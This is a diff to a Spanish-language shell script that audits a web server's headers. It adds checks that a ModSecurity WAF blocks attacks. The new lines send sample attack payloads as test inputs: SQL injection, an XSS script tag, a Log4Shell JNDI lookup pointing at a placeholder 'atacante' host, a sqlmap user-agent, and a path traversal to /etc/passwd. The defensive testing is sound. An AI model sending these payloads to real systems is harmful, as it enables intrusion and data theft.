@@ -35,6 +35,13 @@ echo "$H" | grep -qi '^permissions-policy:'; revisar "Permissions-Policy" $?
 echo "$H" | grep -qi '^server: nginx$'; revisar "No revela la versión de Nginx" $?
 echo "$H" | grep -qi '^x-request-id:'; revisar "X-Request-Id para correlación" $?
 
+echo "WAF (ModSecurity + OWASP CRS)"
+[ "$(estado "$URL/api/catalogo?q=1'%20OR%20'1'='1")" = "403" ]; revisar "Inyección SQL bloqueada (403)" $?
+[ "$(estado "$URL/?q=<script>alert(1)</script>")" = "403" ]; revisar "XSS bloqueado (403)" $?
+[ "$(estado -H 'X-Api-Version: ${jndi:ldap://atacante/a}' "$URL/api/catalogo")" = "403" ]; revisar "Log4Shell bloqueado (403)" $?
+[ "$(estado -A 'sqlmap/1.7' "$URL/")" = "403" ]; revisar "Escáner de vulnerabilidades bloqueado (403)" $?
+[ "$(estado "$URL/api/catalogo?archivo=../../../../etc/passwd")" = "403" ]; revisar "Path traversal bloqueado (403)" $?
+
 echo "Límites"
 [ "$(estado -X TRACE "$URL/")" = "405" ]; revisar "Método TRACE rechazado (405)" $?
 head -c 2000000 /dev/zero | tr '\0' 'a' > /tmp/cuerpo-grande.txt
